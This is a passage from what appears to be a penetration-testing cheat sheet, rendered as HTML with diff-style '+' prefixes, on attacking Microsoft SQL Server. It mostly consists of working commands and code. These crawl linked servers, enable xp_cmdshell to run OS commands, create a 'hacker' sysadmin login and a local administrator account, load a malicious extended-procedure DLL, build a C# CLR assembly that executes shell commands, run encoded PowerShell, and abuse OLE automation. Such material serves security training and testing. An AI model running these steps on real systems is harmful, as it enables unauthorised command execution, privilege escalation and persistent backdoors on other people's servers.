+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> master..sysservers
+</span></span></code></pre></div><h3 id="execute-query-through-the-link">
+  Execute Query Through The Link
+  <a class="anchor" href="#execute-query-through-the-link">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- execute query through the link
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;dcorp-sql1&#34;</span>, <span style="color:#e6db74">&#39;select * from master..sysservers&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;linkedserver&#34;</span>, <span style="color:#e6db74">&#39;select @@version as version&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- chain multiple openquery
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;link1&#34;</span>,<span style="color:#e6db74">&#39;select version from openquery(&#34;link2&#34;,&#34;select @@version as version&#34;)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- execute shell commands
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;</span>) <span style="color:#66d9ef">AT</span> LinkedServer
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;linkedserver&#34;</span>,<span style="color:#e6db74">&#39;select 1;exec master..xp_cmdshell &#34;dir c:&#34;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- create user and give admin privileges
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXECUTE(&#39;&#39;CREATE LOGIN hacker WITH PASSWORD = &#39;&#39;&#39;&#39;P@ssword123.&#39;&#39;&#39;&#39; &#39;&#39;) AT &#34;DOMINIO\SERVER1&#34;&#39;</span>) <span style="color:#66d9ef">AT</span> <span style="color:#e6db74">&#34;DOMINIO\SERVER2&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXECUTE(&#39;&#39;sp_addsrvrolemember &#39;&#39;&#39;&#39;hacker&#39;&#39;&#39;&#39; , &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39; &#39;&#39;) AT &#34;DOMINIO\SERVER1&#34;&#39;</span>) <span style="color:#66d9ef">AT</span> <span style="color:#e6db74">&#34;DOMINIO\SERVER2&#34;</span>
+</span></span></code></pre></div><h3 id="crawl-links-for-instances-in-the-domain">
+  Crawl Links for Instances in the Domain
+  <a class="anchor" href="#crawl-links-for-instances-in-the-domain">#</a>
+</h3>
+<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
+</span></span><span style="display:flex;"><span>select * from master..sysservers
+</span></span></code></pre></div><h3 id="crawl-links-for-a-specific-instance">
+  Crawl Links for a Specific Instance
+  <a class="anchor" href="#crawl-links-for-a-specific-instance">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLServerLinkCrawl -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>select * from openquery(<span style="color:#e6db74">&#34;&lt;instance&gt;&#34;</span>,<span style="color:#e6db74">&#39;select * from openquery(&#34;&lt;instance2&gt;&#34;,&#39;&#39;select * from master..sysservers&#39;&#39;)&#39;</span>)
+</span></span></code></pre></div><h3 id="query-version-of-linked-database">
+  Query Version of Linked Database
+  <a class="anchor" href="#query-version-of-linked-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DBSERVERNAME\DBInstance&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select @@version&#39;)&#34;</span> -Verbose
+</span></span></code></pre></div><h3 id="execute-procedure-on-linked-database">
+  Execute Procedure on Linked Database
+  <a class="anchor" href="#execute-procedure-on-linked-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;,1&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
+</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;RECONFIGURE&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
+</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
+</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;RECONFIGURE&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
+</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;exec xp_cmdshell whoami&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
+</span></span></code></pre></div><h3 id="determine-names-of-linked-databases">
+  Determine Names of Linked Databases
+  <a class="anchor" href="#determine-names-of-linked-databases">#</a>
+</h3>
+<blockquote>
+<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select name from sys.databases&#39;)&#34;</span> -Verbose
+</span></span></code></pre></div><h3 id="determine-all-the-tables-names-from-a-selected-linked-database">
+  Determine All the Tables Names from a Selected Linked Database
+  <a class="anchor" href="#determine-all-the-tables-names-from-a-selected-linked-database">#</a>
+</h3>
+<blockquote>
+<p>The result is TableName which feeds into following query</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables&#39;)&#34;</span> -Verbose
+</span></span></code></pre></div><h3 id="gather-the-top-5-columns-from-a-selected-linked-table">
+  Gather the Top 5 Columns from a Selected Linked Table
+  <a class="anchor" href="#gather-the-top-5-columns-from-a-selected-linked-table">#</a>
+</h3>
+<blockquote>
+<p>The results are ColumnName and ColumnValue which feed into following query</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;&#39;)&#34;</span> -Verbose
+</span></span></code></pre></div><h3 id="gather-entries-from-a-selected-linked-column">
+  Gather Entries from a Selected Linked Column
+  <a class="anchor" href="#gather-entries-from-a-selected-linked-column">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#39;select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;&#39;)&#34;</span> -Verbose
+</span></span></code></pre></div><h2 id="command-execution-via-xp_cmdshell">
+  Command Execution via xp_cmdshell
+  <a class="anchor" href="#command-execution-via-xp_cmdshell">#</a>
+</h2>
+<blockquote>
+<p>xp_cmdshell disabled by default since SQL Server 2005</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command whoami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creates and adds local user backup to the local administrators group:</span>
+</span></span><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;net user backup Password1234 /add&#39;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;net localgroup administrators backup /add&#34;</span> -Verbose
+</span></span></code></pre></div><ul>
+<li>Manually execute the SQL query
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;net user&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master..xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master.dbo.xp_cmdshell <span style="color:#e6db74">&#39;cmd.exe dir c:&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master.dbo.xp_cmdshell <span style="color:#e6db74">&#39;ping 127.0.0.1&#39;</span>;
+</span></span></code></pre></div></li>
+<li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,<span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,<span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span></code></pre></div></li>
+<li>If the procedure was uninstalled
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_addextendedproc <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,<span style="color:#e6db74">&#39;xplog70.dll&#39;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="extended-stored-procedure">
+  Extended Stored Procedure
+  <a class="anchor" href="#extended-stored-procedure">#</a>
+</h2>
+<h3 id="add-the-extended-stored-procedure-and-list-extended-stored-procedures">
+  Add the extended stored procedure and list extended stored procedures
+  <a class="anchor" href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Create evil DLL</span>
+</span></span><span style="display:flex;"><span>Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command <span style="color:#e6db74">&#34;echo test &gt; c:\temp\test.txt&#34;</span> -ExportName xp_test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the DLL and call xp_test</span>
+</span></span><span style="display:flex;"><span>Get-SQLQuery -UserName sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;sp_addextendedproc &#39;xp_test&#39;, &#39;\\10.10.0.1\temp\test.dll&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>Get-SQLQuery -UserName sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;EXEC xp_test&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listing existing</span>
+</span></span><span style="display:flex;"><span>Get-SQLStoredProcedureXP -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose
+</span></span></code></pre></div><ul>
+<li>Build a DLL using 
+  <a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp">xp_evil_template.cpp</a></li>
+<li>Load the DLL
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- can also be loaded from UNC path or Webdav
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sp_addextendedproc <span style="color:#e6db74">&#39;xp_calc&#39;</span>, <span style="color:#e6db74">&#39;C:\mydll\xp_calc.dll&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_calc
+</span></span><span style="display:flex;"><span>sp_dropextendedproc <span style="color:#e6db74">&#39;xp_calc&#39;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="clr-assemblies">
+  CLR Assemblies
+  <a class="anchor" href="#clr-assemblies">#</a>
+</h2>
+<p>Prerequisites:</p>
+<ul>
+<li>sysadmin privileges</li>
+<li>CREATE ASSEMBLY permission (or)</li>
+<li>ALTER ASSEMBLY permission (or)</li>
+</ul>
+<p>The execution takes place with privileges of the <strong>service account</strong>.</p>
+<h3 id="execute-commands-using-clr-assembly">
+  Execute commands using CLR assembly
+  <a class="anchor" href="#execute-commands-using-clr-assembly">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string</span>
+</span></span><span style="display:flex;"><span>Create-SQLFileCLRDll -ProcedureName <span style="color:#e6db74">&#34;runcmd&#34;</span> -OutFile runcmd -OutDir C:\Users\user\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute command using CLR assembly</span>
+</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command <span style="color:#e6db74">&#34;whoami&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;whoami&#34;</span> Verbose
+</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64&gt;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all the stored procedures added using CLR</span>
+</span></span><span style="display:flex;"><span>Get-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose
+</span></span></code></pre></div><h3 id="manually-creating-a-clr-dll-and-importing-it">
+  Manually creating a CLR DLL and importing it
+  <a class="anchor" href="#manually-creating-a-clr-dll-and-importing-it">#</a>
+</h3>
+<p>Create a C# DLL file with the following content, with the command : <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.SqlClient;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.SqlTypes;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Microsoft.SqlServer.Server;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Diagnostics;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Text;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">partial</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StoredProcedures</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    [Microsoft.SqlServer.Server.SqlProcedure]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> cmd_exec (SqlString execCommand)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        Process proc = <span style="color:#66d9ef">new</span> Process();
+</span></span><span style="display:flex;"><span>        proc.StartInfo.FileName = <span style="color:#e6db74">@&#34;C:\Windows\System32\cmd.exe&#34;</span>;
+</span></span><span style="display:flex;"><span>        proc.StartInfo.Arguments = <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">@&#34; /C {0}&#34;</span>, execCommand.Value);
+</span></span><span style="display:flex;"><span>        proc.StartInfo.UseShellExecute = <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        proc.StartInfo.RedirectStandardOutput = <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        proc.Start();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Create the record and specify the metadata for the columns.</span>
+</span></span><span style="display:flex;"><span>        SqlDataRecord <span style="color:#66d9ef">record</span> = <span style="color:#66d9ef">new</span> SqlDataRecord(<span style="color:#66d9ef">new</span> SqlMetaData(<span style="color:#e6db74">&#34;output&#34;</span>, SqlDbType.NVarChar, <span style="color:#ae81ff">4000</span>));
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Mark the beginning of the result set.</span>
+</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsStart(record);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Set values for each column in the row</span>
+</span></span><span style="display:flex;"><span>        record.SetString(<span style="color:#ae81ff">0</span>, proc.StandardOutput.ReadToEnd().ToString());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Send the row back to the client.</span>
+</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsRow(record);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Mark the end of the result set.</span>
+</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsEnd();
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        proc.WaitForExit();
+</span></span><span style="display:flex;"><span>        proc.Close();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Then follow these instructions:</p>
+<ol>
+<li>Enable <code>show advanced options</code> on the server
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,<span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>RECONFIGURE
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
+</span></span></code></pre></div></li>
+<li>Enable CLR on the server
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;clr enabled&#39;</span>,<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>RECONFIGURE
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
+</span></span></code></pre></div></li>
+<li>Import the assembly
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> ASSEMBLY my_assembly
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#39;c:\temp\cmd_exec.dll&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WITH</span> PERMISSION_SET <span style="color:#f92672">=</span> UNSAFE;
+</span></span></code></pre></div></li>
+<li>Link the assembly to a stored procedure
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">PROCEDURE</span> [dbo].[cmd_exec] <span style="color:#f92672">@</span>execCommand NVARCHAR (<span style="color:#ae81ff">4000</span>) <span style="color:#66d9ef">AS</span> <span style="color:#66d9ef">EXTERNAL</span> NAME [my_assembly].[StoredProcedures].[cmd_exec];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
+</span></span></code></pre></div></li>
+<li>Execute and clean
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>cmd_exec <span style="color:#e6db74">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">PROCEDURE</span> cmd_exec
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">DROP</span> ASSEMBLY my_assembly
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>CREATE ASSEMBLY</strong> will also accept an hexadecimal string representation of a CLR DLL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> ASSEMBLY [my_assembly] <span style="color:#66d9ef">AUTHORIZATION</span> [dbo] <span style="color:#66d9ef">FROM</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>x4D5A90000300000004000000F[TRUNCATED]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WITH</span> PERMISSION_SET <span style="color:#f92672">=</span> UNSAFE 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span> 
+</span></span></code></pre></div><h2 id="ole-automation">
+  OLE Automation
+  <a class="anchor" href="#ole-automation">#</a>
+</h2>
+<ul>
+<li>:warning: Disabled by default</li>
+<li>The execution takes place with privileges of the <strong>service account</strong>.</li>
+</ul>
+<h3 id="execute-commands-using-ole-automation-procedures">
+  Execute commands using OLE automation procedures
+  <a class="anchor" href="#execute-commands-using-ole-automation-procedures">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;whoami&#34;</span> Verbose
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Enable OLE Automation</span>
+</span></span><span style="display:flex;"><span>EXEC sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>EXEC sp_configure reconfigure
+</span></span><span style="display:flex;"><span>EXEC sp_configure <span style="color:#e6db74">&#39;OLE Automation Procedures&#39;</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>EXEC sp_configure reconfigure
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute commands</span>
+</span></span><span style="display:flex;"><span>DECLARE @execmd INT
+</span></span><span style="display:flex;"><span>EXEC SP_OACREATE <span style="color:#e6db74">&#39;wscript.shell&#39;</span>, @execmd OUTPUT
+</span></span><span style="display:flex;"><span>EXEC SP_OAMETHOD @execmd, <span style="color:#e6db74">&#39;run&#39;</span>, null, <span style="color:#e6db74">&#39;%systemroot%\system32\cmd.exe /c&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py</span>
+</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -install -clr Microsoft.SqlServer.Proxy.dll
+</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -check -reciclador <span style="color:#e6db74">&#39;C:\windows\temp\reciclador.dll&#39;</span>
